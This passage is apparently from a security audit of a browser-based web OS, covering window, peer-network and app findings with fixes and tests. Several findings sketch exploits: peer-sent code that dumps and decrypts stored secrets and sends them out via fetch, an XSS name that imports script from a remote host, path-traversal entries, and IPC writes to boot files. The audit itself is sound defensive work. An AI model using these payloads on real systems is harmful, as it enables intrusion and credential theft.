- **Fix**: [runtime] through the broker: owner or `process:manage` holder only; messages carry the sender's app id and need an `ipc:send:<id>` grant.
- **Test**: app A calling `process.kill(<pid of B>)` is denied.

### WIN-10: `props` leaks live kernel objects; SDK init hijackable
- **Severity**: Low · **Attacker**: A1 (extends KRN-6)
- **Where**: `src/core/window-manager.ts:404-405` (live `namespace` — its ACL array is mutable despite TS `private readonly` — and `proxyFs`), `:444` (port posted `'*'` on first load); `src/sw.ts:25` (AppSDK accepts `wos:sdk-init` from any source — a nested frame can race in and take the channel).
- **Fix**: [quick] stop passing `namespace`/`proxyFs`; pin the target; SDK requires `ev.source === parent`.
- **Test**: `props.namespace.acl.push({path:'/',write:true})` then writing `/etc/x` → denied.

Out-of-scope notes from WIN: `core.add-module` (`src/remote.ts:169`) loads any script URL into a privileged module frame; bookmarks and the RSS widget use `window.top.open(url)` without `noopener` (the opened site gets an opener reference → KRN-1).

**WIN architecture notes**
- Window SDK surface sandboxed apps need (from current `props` usage): pid, launch `$args` (a file-open arg also grants that path), `setTitle` (text), `close`/`kill` (self), `onDestroy`, `onSignal('SIGTERM')`, `onMessage` (mediated, with sender id), `setWindowView`, `toggleFullScreen`, `toggleHeader`, `getBounds`/`setBounds` (numeric, clamped), `appendActionButton({icon,title})` with click events over the port, `setHeaderStyle` (allowlisted tokens), viewport size; plus layout requests: context menu (app sends items, layout returns the chosen id), `openWindow`/`callCommand` (permission-checked), a granting file picker (powerbox), drag-drop delivering file bytes not paths.
- Layout TCB keeps: top document, window containers/headers/drag/resize/snap, taskbar, context-menu rendering, desktop icons, wallpaper host, one broker endpoint per frame. Code now in `/opt/window-manager.js`, `/opt/wm`, `/opt/desktop`, `menuItem.js` moves into the bundle (or is pinned by hash); vfs config is data only.
- Commands become manifest-declared launcher stubs: executing one = "spawn a sandboxed window with these args"; no app callback runs in the top realm; no code strings anywhere (`{command, args}`).
- The layout must stop reaching into frames (`iframe.contentWindow.document` body margin `src/core/window-manager.ts:383`, title reads in `src/core/iframe/index.tsx` and `src/apps/vs-code/index.tsx`, `performance.memory`) and must stop patching child globals (`platform`, `fetch`).
- Asset loading: code comments state opaque-origin frames aren't SW-controlled (subresources 404) but `/(sw)` navigations are intercepted (`src/core/window-manager.ts:435-437`, `opt/apps/file-explorer/main.js:1568-1573`) — so first-party apps load from the static `/public/mount/opt/apps/<id>/…` with the sandbox attribute; vfs-only apps via srcdoc with kernel-inlined assets.
- Already the right shape: dock, canvas wallpaper, `ui.sandboxed-app` (srcdoc, opaque origin) — they only need a scoped per-frame port instead of the global listener.
- Open policy: open = view; run = explicit Run into a sandboxed process; files from peers, drag-drop, unzip and curl carry a provenance tag so the UI can warn.
- Cross-origin embeds (Browser, YouTube, vs-code) keep their own origin via a restricted sandbox; any same-origin URL is always an untrusted vfs app.

---

## NET — network / peer ingress apps

All paths under `docs/public/mount/opt/apps/` unless noted. Duplicates merged: NET-2 → KRN-1 (third-party
embeds — `youtube-player/main.html:72`, `speed-test/main.html:1` (fast.com), `vscode-online/main.html:15`,
`ui.iframe` external URLs — all have `window.top` = the OS and can use the open `wos-ipc` fs endpoint;
the SW-injected AppSDK also binds to the first `wos:sdk-init` port from any window, so a child frame can
win the race before the parent's `load`). NET-8 → WIN-3 (files from peers/SSH hosts — `/mnt/**`, saved
downloads — are treated like trusted local files; `webrtc/main.html:2385-2397` keeps the peer-chosen
extension).

### NET-1: Distributed Compute auto-runs peer-sent code with origin privileges
- **Severity**: Critical · **Attacker**: A3
- **Where**: `distributed-compute/ui/app.js:46-51` (responder always started, Worker runner); `lib/scheduler.js:60-75,83-121`; `lib/worker-task-runtime.js:27-31,83`; `lib/task-runtime.js:40-48`; `webrtc/main.html:718-725` (onGroup), `:1531-1535` (onAppRelay).
- **Root cause**: any member of a shared group can send `dc-task`; `taskSource` runs via `new Function` in a blob Worker spawned from the same-origin app iframe (so the Worker has the site origin), or — without a Worker — on the iframe main thread with `window.platform`/`window.top`. A peer can create a group containing the victim without consent.
- **Exploit**: send `create` group, then `app-relay` `{type:'dc-task', to:victimId, taskSource:"indexedDB.databases().then(...)"}` → dumps the vfs IndexedDB stores, decrypts Remote Machines secrets (NET-7), exfiltrates with `fetch`; persistence via `caches.open('WebOS_v1').put('/(sw)/opt/apps/terminal/main.html', evil)` — `src/sw.ts` checks the cache before the vfs (chain not run end-to-end).
- **Fix**: [quick] responder off by default; explicit per-group/per-peer "accept tasks"; spawn task Workers from inside a hidden `<iframe sandbox="allow-scripts">` srcdoc with CSP `connect-src 'none'` (opaque origin: no IndexedDB, caches or exfiltration); consent for group adds (NET-11). [runtime] through the broker.
- **Test**: deliver a task returning `indexedDB.open('x')` / `caches.open('x')` results → doesn't run before opt-in; SecurityError after opt-in.

### NET-3: WebRTC remote mount path traversal
- **Severity**: High · **Attacker**: A3
- **Where**: `webrtc/main.html:1742-1755` (walkRemote uses `e.n` raw), `:1727`, `:1770-1778`, `:1819`, `:1828`.
- **Root cause**: entry names from the peer's `list` reply are joined into absolute vfs paths unvalidated; BrowserFS resolves `..`, so writes/mkdirs/deletes escape `/mnt/webrtc/<label>`. Only the owner side (`segmentsOf`) validates.
- **Exploit**: the peer lists `{n:'../../../etc/widgets/pwn.js'}` and serves its bytes; the victim clicks Mount → `/etc/widgets/pwn.js` runs every boot (`src/remote.ts:125-141`).
- **Fix**: [quick] validate names (reject `/`, `\`, `.`, `..`, NUL, control chars, over-long) and assert the normalised path stays under `mount.path + '/'`. [runtime] kernel mount API takes only backend-relative paths.
- **Test**: stub `vfsCall`/`vfsDownload` to return a traversal entry, run `syncMount` → nothing written outside the mount.

### NET-4: Remote Machines mirror path traversal
- **Severity**: High · **Attacker**: A5
- **Where**: `remote-machines/main.html:1245-1276` (reconcile), `:1303` (fetch write), `:905-931` (saveToVfs nested `child.name`), `:219` (`cleanName` keeps `..`).
- **Root cause**: names from the bridge's `fs.list` become absolute vfs paths. The honest bridge normalises to a basename (`downloads/remote-machines/bridge.mjs:21554-21577`), so the attacker is a malicious bridge — and the bridge URL lives in vfs-writable `settings.json`.
- **Exploit**: a malicious bridge returns `{name:'../../../etc/widgets/x.js', kind:'file', size:9}`; zero-click after connecting (`mount()` lists `/` and prefetches files ≤ 512 KB).
- **Fix**: [quick] same name validation + stay-in-mount assertion, also in `saveToVfs` and `cleanName`.
- **Test**: monkeypatch `session.rpc('fs.list')` with traversal names → no write outside `/mnt/ssh`.

### NET-5: XSS via a peer's display name in the compute roster
- **Severity**: High · **Attacker**: A3
- **Where**: `distributed-compute/ui/app.js:76` (innerHTML, re-rendered every 3 s `:320`); names only stripped of control chars (`webrtc/main.html:181,463,498`).
- **Exploit**: rename to `<img src=x onerror=import('//ab.cd/x')>` (37 chars, under the 40 limit) → runs in a frame that has `window.platform` once the victim selects the group.
- **Fix**: [quick] `textContent` (distributed-kv's `escapeHtml` already does this right).
- **Test**: a mesh snapshot with an XSS name renders as text; `window.__xss` unset.

### NET-6: WebRTC control + mesh commands callable by any app
- **Severity**: High · **Attacker**: A1 (→ A3 victims)
- **Where**: `webrtc/main.html:2511-2518`, `:1516-1530`, `:2003-2031`; `bin/webrtc.run:6`.
- **Root cause**: any same-origin code can call `webrtc.api` (share any folder rw, grant, mount, `sendfile` any path) and `webrtc.mesh.send`/`subscribe` on any channel, and can re-register those names (newest wins).
- **Exploit**: `getCommand('webrtc.api').exec('share','add','/home/user1','x','rw')` + grant the attacker's peer → exfiltration; or send `distributed-compute` tasks to every peer → NET-1 becomes a worm.
- **Fix**: [runtime] per-calling-app permissions; the bridge forces channel = caller appId. [quick] mutating `webrtc.api` subcommands require confirmation in the WebRTC window.
- **Test**: from a test app frame, `share add … rw` → refused or prompted.

### NET-7: Secrets readable/decryptable by any same-origin code
- **Severity**: High · **Attacker**: A1 (A3 via NET-1)
- **Where**: `remote-machines/main.html:200-206`, `:304-372`, `:460-473`; `webrtc/main.html:270-324`.
- **Root cause**: the AES key is non-extractable but lives in origin-wide IndexedDB (`remote-machines-keystore`), so any script/Worker on the origin can decrypt `secrets.json` (SSH passwords, private keys, bridge token). Live sessions and unremembered secrets sit in the Remote Machines frame's realm, scriptable from other frames via `top.frames`. TURN credentials are plaintext JSON. Rewriting `bridgeUrl` sends credentials to the attacker.
- **Exploit**: `indexedDB.open('remote-machines-keystore')` → `get('master')` → `subtle.decrypt(secrets.json)`; or inject into the Remote Machines frame and `session.rpc('exec.run',{script:'…'})`.
- **Fix**: [runtime] opaque-origin isolation per app + broker-owned per-app secret store. [quick] seal `bridgeUrl` together with the token; confirm when the bridge host changes.
- **Test**: from another app, reading/decrypting the secrets fails once apps are sandboxed.

### NET-9: Received SVG becomes a same-origin `blob:` URL
- **Severity**: Medium · **Attacker**: A3
- **Where**: `webrtc/main.html:372`, `:758`, `:858`, `:2248-2258`, `:2286`, `:2434`.
- **Root cause**: `safeMime` allows `image/svg+xml`; opening the preview/download link in a new tab runs the SVG's script on the site origin (exact browser behaviour unverified).
- **Fix**: [quick] `application/octet-stream` for download links; SVG only in `<img>` (or rasterise).
- **Test**: no link `href` points at a blob of type `image/svg+xml`.

### NET-10: Read-write shares of system folders give peers code execution
- **Severity**: Medium · **Attacker**: A3 (needs the user to share such a folder)
- **Where**: `webrtc/main.html:1638-1646` (`addShare` refuses only `/`).
- **Root cause**: `/etc`, `/opt`, `/home/user1/.local` can be shared rw — they hold auto-run files (`/etc/widgets`, systemd units + `enabled.json`, `crontab`, `/opt/cron`, `contextmenu.json`, `pkg/installed.json`) and other apps' secrets; the UI warns only about data access.
- **Fix**: [quick] refuse (or force read-only) `/etc`, `/opt`, `/usr`, `/bin`, `/boot`, `/proc` and their ancestors; exclude `~/.local/share` by default.
- **Test**: `webrtc share add /etc x rw` fails.

### NET-11: Transitive peer trust; self-asserted identity
- **Severity**: Medium · **Attacker**: A3
- **Where**: `webrtc/main.html:271`, `:495-518`, `:534-580`, `:718-725`.
- **Root cause**: `autoMesh` (default on) auto-dials/answers anyone a connected peer introduces, with chat and file permissions on; the `hello` id is random and unauthenticated (an attacker can claim an offline member's id); peers can add you to groups without consent.
- **Fix**: [quick] `autoMesh` off by default (or prompt); accept before joining a group. [later] signed hello with a per-device key, pinned identities.
- **Test**: an incoming group `create` leaves a pending invite, not membership.

### NET-12: Webamp runs unpinned CDN code in the top document
- **Severity**: Medium · **Attacker**: A5 (supply chain)
- **Where**: `wamp-client/WAMP.html:202-213` (`https://unpkg.com/webamp`, no version, no SRI); `wamp-client/main.js:1-4,146-151` (renders into `window.top.document`).
- **Fix**: [quick] vendor or pin with SRI. [runtime] Webamp in its own sandboxed window.
- **Test**: after launch, the top document has no `unpkg` script tags.

### NET-13: Missing resource-exhaustion limits
- **Severity**: Low · **Attacker**: A3, A6
- **Where**: `webrtc/main.html:343-344` (inflates fully before the 100 KB check); `distributed-compute/lib/mesh-client.js`, `distributed-kv/lib/mesh-client.js` (`payload.total`/`seq` unbounded, partial reassemblies never expire).
- **Fix**: [quick] streaming decompression cap; cap `total`, expire stale entries.
- **Test**: a high-ratio invite errors without a large allocation.

### NET-14: relay/, v2/, embedded code-server (informational)
- **Severity**: Low · **Attacker**: A4
- **Where**: `.gitignore:6,21`; `relay/wisp-relay-server.py:430`; `vscode-online/main.html:15`.
- **Notes**: relay/ and v2/ are gitignored, untracked and outside `docs/` — not deployed. When run, the relay binds 0.0.0.0 without auth (open LAN relay). If `code-public.pankajdevesh.com` has no auth it is a public shell (unverified). Fix: bind the relay to 127.0.0.1 by default; confirm code-server auth.

**NET architecture notes**
- Inside a sandbox, webrtc needs `RTCPeerConnection` + data channels, `getUserMedia` (`allow="microphone"`; opaque-origin behaviour — see spike), clipboard write, downloads (`allow-downloads`), `CompressionStream`. Remote Machines needs a WebSocket to the bridge (localhost/wss), xterm from a CDN, and the `Buffer` polyfill (today borrowed from `window.top`). distributed-compute needs Workers spawned inside its own opaque frame — never site-origin blob Workers.
- Folder mounting (`FS.mount`/`FS.createBackend`, used by webrtc and Remote Machines) becomes a broker capability: the kernel hosts the mirror and validates every path; apps are async providers. `vfs:changed` becomes a broker event, not `window.top.dispatchEvent`.
- The cross-app mesh bridge becomes broker pub/sub: channels namespaced by the caller's appId, membership consent enforced by the broker, JSON-only payloads. Cross-app command calls (`webrtc.api`, `webrtc.deliver`, `webrtc.mesh.*`) need caller identity + per-command grants; registrations not shadowable.
- Secrets need a broker-held per-app store so other same-origin code can't use the key.
- Peer/host-supplied content carries a noexec/untrusted label with the vfs entry; the launcher refuses to run it with privileges.

---

## APP — content viewers, editors, utility apps

All paths under `docs/public/mount/opt/apps/` unless noted. Duplicates merged: APP-1 → KRN-3 (more
sinks: `app-drawer/main.js:62` escapes `'` but not `\`, `spotlight/main.js:134-139`,
`explorer-sifi/main.js:403`), APP-2 → WIN-3, APP-3 → BOOT-8 (explorer "Extract": entry
`../../../../.initd.run` lands at `/.initd.run`), APP-4 → WIN-8 (the compiled markdown viewer loads at
boot via `src/modules/modules.json:60`; `![a](x"onerror="top.pwned=1)` fires on render).

### APP-5: Notebook renders markdown cells unsanitised on load
- **Severity**: High · **Attacker**: A2, A3
- **Where**: `notebook/notebook.html:537,684` (`innerHTML = marked.parse(src)`); host page is an unsandboxed same-origin iframe; `notebook/main.js:16-51` hands it raw fs as `__nbBridge`; `.ipynb` is a registered extension.
- **Root cause**: marked passes raw HTML; HTML *outputs* are sandboxed (`:384`) but markdown cells aren't.
- **Fix**: [quick] DOMPurify on marked output. [runtime] notebook in an opaque sandbox.
- **Test**: open a crafted `.ipynb` → nothing set.

### APP-6: ai-dom-lens runs fetched web pages / vfs HTML as the site origin
- **Severity**: High · **Attacker**: A4, A5, A2
- **Where**: `ai-dom-lens/main.html:292` (`#pageFrame` no sandbox), `:442-448` (URL mode), `:505-513` (vfs mode, unsanitised marked); window from `sandboxAppIframe` (`main.js:15`).
- **Root cause**: unsandboxed `srcdoc` inherits the parent origin → third-party scripts get full privileges.
- **Fix**: [quick] `sandbox="allow-same-origin"` without `allow-scripts` (scripts blocked; the lens can still read `contentDocument`).
- **Test**: load a page with `<script>top.pwned=1</script>` → unset; DOM queries still work.

### APP-7: Mermaid `securityLevel: 'loose'`
- **Severity**: High (one click) · **Attacker**: A2, A3
- **Where**: `mermaid-viewer/main.js:97`; rendered via `dangerouslySetInnerHTML` `:398`; floating CDN `mermaid@11`.
- **Root cause**: loose mode enables `click … call fn()` and unsanitised link URLs (runtime unverified), output in a same-origin window.
- **Fix**: [quick] `securityLevel:'strict'`; pinned version + SRI.
- **Test**: `.mmd` with `click A href "javascript:top.pwned=1"`, click the node → nothing set.

### APP-8: TOTP seeds in plaintext, origin-wide localStorage
- **Severity**: High · **Attacker**: A1 (A4 via APP-9)
- **Where**: `totp-auth/main.html:110-128` — launched via `pkg-manager/main.js:139` → `ui.iframe` where `window.ipc` is absent, so it falls back to `localStorage['totp_entries']` (intended store `/home/user1/.totp-accounts.json`); names via `innerHTML` `:171`.
- **Root cause**: no private per-app storage (the registry says "Stores secrets locally in the VFS").
- **Fix**: [quick] store only under `/home/user1/.local/share/totp-auth/`, drop localStorage, escape names, optional passphrase encryption (PBKDF2 + AES-GCM). [runtime] broker-enforced private data dir. Note: `save()` calls localStorage outside its try block — it will throw in an opaque origin.
- **Test**: another app reading the store is denied.

### APP-9: Bookmark clicks give external sites `window.opener` → unauthenticated IPC
- **Severity**: High · **Attacker**: A4 (extends KRN-1)
- **Where**: `bookmarks/main.js:31-33` (`callCommand('ui.iframe', url)` passes the URL as `body`, `ui.iframe` throws, the fallback is `window.top.open(url,'_blank')` without `noopener`) → `src/kernel/ipc-bus.ts:66-140`.
- **Exploit**: the bookmarked site posts `opener.postMessage({type:'wos-ipc',id:1,event:'fs.write',data:{path:'/.initd.run',content:'…'}},'*')`.
- **Fix**: [quick] `noopener,noreferrer`; open bookmarks via `open-window`; authenticate IPC (KRN-1).
- **Test**: open a bookmark to a second-origin page → `opener === null`, no `wos-ipc-response`.

### APP-10: World-writable TrainBoard log → XSS in TrainBoard
- **Severity**: High (defeats the ACL design) · **Attacker**: A1
- **Where**: `src/platform/namespace.ts:45` (every app may write `/home/user1/.local/share/trainboard`); `trainboard/main.html:153,214`, `board.html:224` render values via `innerHTML` inside a `sandboxAppIframe`.
- **Exploit**: append `{"run":"<img src=x onerror=top.pwned=1>","metric":"m","step":0,"value":0}` to `log.jsonl`.
- **Fix**: [quick] `textContent`; validate `run`/`metric` `^[\w.-]{1,64}$`. [runtime] broker `metrics.log()` instead of a shared file.
- **Test**: write that row, open TrainBoard → nothing set.

### APP-11: Third-party CDN code with full privileges — unpinned, no SRI
- **Severity**: High · **Attacker**: A5 (supply chain)
- **Where**: zero `integrity=` attributes in the vfs; floating/unversioned: xterm (`terminal/main.html:7,138`), `react-markdown@latest` + `remark-gfm` (`markdown-reader/md-renderer.html`), `mermaid@11`, `@codemirror/*@6` (fs-inspector), `chart.js@4`, `jspdf@2`, `pdf-lib@1`, unversioned tfjs/chart.js in `home/user1/projects`.
- **Fix**: [quick] exact versions + SRI, or vendor into `docs/`. [runtime] the sandbox bounds the blast radius.
- **Test**: static check — every external URL has an exact version and `integrity`.

### APP-12: Code runners execute project code with whole-OS privileges
- **Severity**: Medium (needs an explicit Run) · **Attacker**: A2, A3
- **Where**: `ts-ide/main.html:131` (preview `sandbox="allow-scripts allow-same-origin"` — can unsandbox itself); Pyodide apps (python-repl, python-demo, todo-python, notebook) — the `js` module exposes `window.top`; IDE windows are `sandboxAppIframe`s.
- **Fix**: [quick] drop `allow-same-origin` from the ts-ide preview (console forwarding already uses postMessage). [runtime] interpreters in opaque frames/workers, granted only the project dir.
- **Test**: `parent.parent.platform` in ts-ide preview code → undefined/throws.

### APP-13: Dashboard runs code from its JSON config; picker inline-handler injection
- **Severity**: Medium · **Attacker**: A1, A3, A5
- **Where**: `dashboard/dashboard.html:515` (`new Function` on custom-widget `code`), `:383` (`mapFn`), `:497` (iframe widget `src` accepts `javascript:`), `:277-302` (`onclick="fpNavigate('${esc(path)}')"`, `esc` `:1062` doesn't escape `'` — attribute HTML-decoding defeats it anyway); config `/home/user1/.local/share/dashboard/dashboard.json`.
- **Fix**: [quick] `addEventListener` + data attributes; only `http(s)` URLs. [runtime] widget code in an opaque sandbox.
- **Test**: click a folder named `a');top.pwned=1;('` in the picker → nothing set.

### APP-14: File names / window titles injected as HTML in other renderers
- **Severity**: Medium · **Attacker**: A2, A3, A5 (extends WIN-7)
- **Where**: `audio-player/player.html:284` (`${name}`); `fs-inspector/main.html:606` (real-disk folder names, while holding a readwrite `showDirectoryPicker` handle `:740`); `dock/macos.html:181`, `dock/gnome.html:153` (titles via `innerHTML`; viewers set titles from file names, e.g. `src/apps/markdown/index.tsx:41`).
- **Fix**: [quick] `textContent`; lint rule banning templated `innerHTML`.
- **Test**: open `<img src=x onerror=top.pwned=1>.mp3` in Audio Player → nothing set.

### APP-15: Apps reach into the top document / shared top globals
- **Severity**: Low · **Attacker**: A1
- **Where**: `spotlight/main.js:209` (overlay in `top.document`), `sqlite-browser/main.js:116-118` (+ sqlite-charts: loader iframe in `top.document`), `mermaid-viewer/main.js:423`, `window.top.__vfsDragPath` (`audio-player/main.js:41-46`), `top.__fsDrop` (`fs-inspector/main.html:573`), `dev-utils/main.js:485,561` (`top.jspdf`/`top.PDFLib`), `wamp-client/main.js:1` (`top` as its global).
- **Exploit**: set `top.__vfsDragPath='/home/user1/.totp-accounts.json'` → the next drop makes another app read it.
- **Fix**: [runtime] overlays/global shortcuts become layout or broker features; drag paths via `dataTransfer` only; each app loads its own libraries.
- **Test**: static grep — no app references `top.`/`parent.`.

### App inventory

Hosting: **M** = `main.js` runs in the top realm, renders into the window's same-origin about:blank body ·
**I** = own unsandboxed same-origin iframe · **X** = `sandboxAppIframe` (allow-scripts + allow-same-origin
→ effectively same-origin, escapable) · **H** = HTML-only, launched via `exec` → `ui.iframe` with
`window.platform` injected · **D** = opaque srcdoc + `/usr/lib/ipc.js`.
APIs: f sync fs · p platform/host · t top/parent DOM or globals · r registerCommand · s
execCommand/callCommand/services · l localStorage/IndexedDB · e eval/new Function/execString · a AppSDK.

| App(s) | Hosting | APIs | Migration |
|---|---|---|---|
| file-explorer, explorer-sifi | M | f p t r s e | L |
| pkg-manager | M | f p t r s (writes `/opt`, `/etc/pkg`; execs installed apps) | L |
| spotlight | M | f p t r s | M |
| app-drawer, app-launcher, task-manager | M | p r s l (task-manager: process.kill) | S–M |
| csv-viewer, diff-viewer, image-viewer, graph-editor, mermaid-viewer, markdown-reader | M | f p r (mermaid: t) | S |
| sqlite-browser, sqlite-charts | M | f p t r | M |
| dev-utils, bookmarks | M | p t r (bookmarks: f) | S |
| snake-game, snake-lstm, snake-qlearning, snake-cnn3d, trainboard, cpp-ide | X | a p s | S |
| ai-dom-lens, alpine-wasm, ts-ide, vector-store, robot-sim | X | a p s (ts-ide: e) | M |
| nn-ide, model-builder | X | a f p t s e | L |
| audio-player, colleps, python-repl, python-demo, todo-python | I | f p t s (pyodide `js`) | M |
| dashboard, notebook | I | f p e (notebook: `__nbBridge`) | M |
| totp-auth, screen-reader | H | l (totp), `getDisplayMedia` (screen-reader) | S |
| fs-inspector | H | f t, File System Access handle | M |
| settings, terminal | H | f s e l (`execString` of `/etc/settings`, `execCommand` of `/bin/*.run`) | L |
| analyze, anova, threejs-demo, threejs-flow, webgl-demo, webgl-earth, glsl-shader | H | CDN scripts only | S |
| dock/*.html | D | raw fs via unauthenticated wos-ipc, `wm.*` | S |
| webrtc, remote-machines, distributed-compute, distributed-kv, youtube-player (I); wamp-client (M); speed-test, vscode-online (H) | see NET | — | L / M |

**APP architecture notes**
- Nothing in scope is isolated today: M, I, H and X are all effectively same-origin, so every XSS above is a full OS takeover; the opaque docks lose their isolation through raw wos-ipc fs.
- X-group apps (snakes, trainboard, cpp-ide) already use the async AppSDK — good first pilots; ~25 apps depend on synchronous `getFS()`.
- A structured `open(cmd, ...args)` API fixes the interpolated-`execCommand` class without the sandbox runtime.
- Implicit powers → explicit capabilities: file pickers (granting the chosen file), open-with handoff, window title, overlays/global shortcuts (spotlight → layout), process list/kill (task-manager), clipboard, downloads, display/mic capture, File System Access handles, network.
- Shared writable inputs are cross-app injection channels (trainboard log, `dashboard.json`, `/etc/settings`, window titles) — broker APIs + schema validation + `textContent`.
- Renderers of untrusted content nest their own opaque frame (markdown, notebook markdown, mermaid, html/svg, ai-dom-lens page); for script-free DOM inspection use `sandbox="allow-same-origin"`.
- Vendor + pin CDN libraries under `docs/` — GitHub Pages serves them with `ACAO:*`, so opaque frames load them by URL without the SW, and SRI becomes possible.
